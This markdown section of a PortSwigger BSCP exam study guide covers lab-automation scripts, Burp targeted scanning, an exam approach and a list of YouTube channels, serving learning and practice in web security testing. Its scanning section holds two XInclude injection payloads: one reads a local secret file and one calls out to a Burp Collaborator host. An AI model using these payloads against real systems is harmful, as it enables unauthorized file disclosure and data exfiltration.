>This section contain **additional** information to solving the Portswigger labs and approaching the BSCP exam, such as the youtube content creators, Burp speed scanning technique, and python automated scripts I copied from [TJCHacking](https://www.youtube.com/@tjchacking/videos).  

## Solve Labs with Python  

>These python scripts are small set of the code written by [Github: Trevor tjcim](https://github.com/tjcim).  

[Lab Automated Python Scripts](python/README.md)  

[Automate the solving of the labs using python scripts](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/tree/main/python)  

## Focus Scanning  

>Due to the tight time limit during engagements or exam, [scan defined insertion points](https://portswigger.net/web-security/essential-skills/using-burp-scanner-during-manual-testing) for specific requests.  

![scan-defined-insertion-points](images/scan-defined-insertion-points.png)  

>Scanner detected **XML injection** vulnerability on storeId parameter and this lead to reading the secret Carlos file.  

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///home/carlos/secret"/></foo>
```  

>Out of band XInclude request, need hosted DTD to read local file.  

```xml
<hqt xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://vfe7mddka77io3rz2xjvvbum5db9zzn0br1er2g.oastify.com/foo"/></hqt>
```  

[PortSwigger Lab: Discovering vulnerabilities quickly with targeted scanning](https://portswigger.net/web-security/essential-skills/using-burp-scanner-during-manual-testing/lab-discovering-vulnerabilities-quickly-with-targeted-scanning)  
  
## Approach  

>If stuck in BSCP exam, then use [Micah van Deusen blog tip 5 table of category to stages](https://micahvandeusen.com/burp-suite-certified-practitioner-exam-review/) for ways to progress through the stages.  
>This is my personal view of the possible approach to leverage identified vulnerabilites and then using these notes to progress through the BSCP exam stages.  

![Three stages](images/3stages.png)  

## YouTube Training Playlist 
  
[YouTube Study Playlist](https://youtube.com/playlist?list=PLsDxQTEdg_YkVMP6PybE7I-hAdhR7adem)  

Youtube channels:  

1. [Rana Khalil](https://www.youtube.com/@RanaKhalil101/videos)  
2. [David Bombal](https://www.youtube.com/@davidbombal/videos)  
3. [intigriti](https://www.youtube.com/@intigriti/videos)  
4. [Seven Seas Security](https://www.youtube.com/@7SeasSecurity/videos)  
5. [The Cyber Mentor](https://www.youtube.com/@TCMSecurityAcademy/videos)  
6. [Tib3rius](https://www.youtube.com/@Tib3rius/videos)  
7. [John Hammond](https://www.youtube.com/@_JohnHammond/videos)  
8. [TraceTheCode](https://www.youtube.com/@TraceTheCode/videos)  
9. [Sabyasachi Paul](https://www.youtube.com/@h0tPlug1n/videos)  
10. [bmdyy](https://www.youtube.com/@bmdyy/videos)  
11. [securityguideme](https://www.youtube.com/@securityguideme/videos)  
12. [nu11 security](https://www.youtube.com/@Nul1Secur1ty/videos)  
13. [PortSwigger](https://www.youtube.com/@PortSwiggerTV/videos)  
14. [IppSec](https://www.youtube.com/@ippsec/videos)  
15. [TJCHacking](https://www.youtube.com/@tjchacking/videos)  
16. [LiveUnderflow](https://www.youtube.com/@LiveUnderflow/videos)  
  

## Footnote

>This PortSwigger exam is designed to be challenging, it is not straight forward vulnerabilities, twisted challenges, mixed academy labs into single problem and even rabbit holes.  
>**Perseverance:** Persistence in doing something despite difficulty or delay in achieving success.  
>#TryHarder  

  
